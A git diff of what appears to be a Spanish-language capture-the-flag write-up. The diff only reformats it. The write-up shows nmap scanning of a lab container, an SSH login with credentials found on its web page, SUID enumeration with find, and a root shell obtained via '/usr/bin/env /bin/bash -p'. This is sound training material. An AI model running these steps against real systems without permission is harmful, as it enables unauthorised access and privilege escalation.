@@ -8,15 +8,18 @@
 
 '''
 ping -c1 172.17.0.2
+
 '''
 
 '''
+
 PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms
 
 --- 172.17.0.2 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 0.065/0.065/0.065/0.000 ms
+
 '''
 
 <p>Como podemos observar la máquina esta encendida, por el TTL se puede intuir que es una máquina Linux</p>
@@ -24,10 +27,13 @@ rtt min/avg/max/mdev = 0.065/0.065/0.065/0.000 ms
 <p>Con esto comprobado procedemos a realizar el primer escaneo con nmap</p>
 
 '''
+
 sudo nmap -p- --open -sS -vvv -Pn 172.17.0.2
+
 '''
 
 '''
+
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 00:03 CET
 Initiating ARP Ping Scan at 00:03
@@ -53,16 +59,20 @@ MAC Address: 02:42:AC:11:00:02 (Unknown)
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+           
 '''
 
 <p>El escaneo nos reporta que los puertos 22 y 80 estan abiertos lo cual puede ser un indicativo de que hay una página web corriendo en la máquina</p>
 <p>Realizamos un segundo escaneo de esos puertos para obtener información mas detallada</p>
 
 '''
+
 sudo nmap -p 22,80 -sV -vvv -Pn 172.17.0.2
+
 '''
 
 '''
+
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 00:06 CET
 NSE: Loaded 46 scripts for scanning.
@@ -101,6 +111,7 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
            Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
+           
 '''
 
 <p>Este escaneo nos reporta que estamos ante una máquina Ubuntu la cual corre un Apache 2.4.52</p>
@@ -108,7 +119,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 
 
 
-##Pagina Web
+## Pagina Web
 
 <p>Introducimos la IP de la máquina en el navegador y nos lleva a la siguiente página</p>
 
@@ -125,14 +136,17 @@ Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
 
 <p>Nos da un nombre de usuario y una contraseña</p>
 
-##Conexión por ssh
+## Conexión por ssh
 <p>Aprovechando este nombre y contraseña tratamos de conectarnos por ssh</p>
 
 '''
+
 ssh dylan@172.17.0.2
+
 '''
 
 '''
+
 dylan@172.17.0.2's password: 
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.8.11-amd64 x86_64)
 
@@ -146,39 +160,51 @@ not required on a system that users do not log into.
 To restore this content, you can run the 'unminimize' command.
 Last login: Wed Feb  5 23:25:00 2025 from 172.17.0.1
 dylan@7af8994eca56:~$ 
+
 '''
 <p>Ha funcionado, tenemos una conexión ssh con la máquina</p>
 
-##Escalada de privilegios
+## Escalada de privilegios
 
 Comprobamos que somos el usuario dylan
 
 '''
+
 whoami
+
 '''
 
 '''
+
 dylan
+
 '''
 
 <p>Buscamos los programas sobre los que tenemos privilegios</p>
 
 '''
+
 sudo -l
+
 '''
 
 '''
+
 -bash: sudo: command not found
+
 '''
 
 <p>Probamos otra forma de busqueda</p>
 
 <p>Buscamos todos los archivos con permiso SUID y cuyo usuario sea root de forma que al ejecutarse lo hagan como este</p>
 '''
+
 find / -perm -4000 -user root 2>/dev/null
+
 '''
 
 '''
+
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/openssh/ssh-keysign
 /usr/bin/newgrp
@@ -197,10 +223,13 @@ find / -perm -4000 -user root 2>/dev/null
 <p>Probamos a ejecutar /bin/bash con /bin/env de forma que al cumplir con las caracteristicas mencionadas anteriormente debería devolver una bash con permisos de root</p>
 
 '''
+
 /usr/bin/env /bin/bash -p
+
 '''
 
 '''
+
 bash-5.1# whoami
 root
 
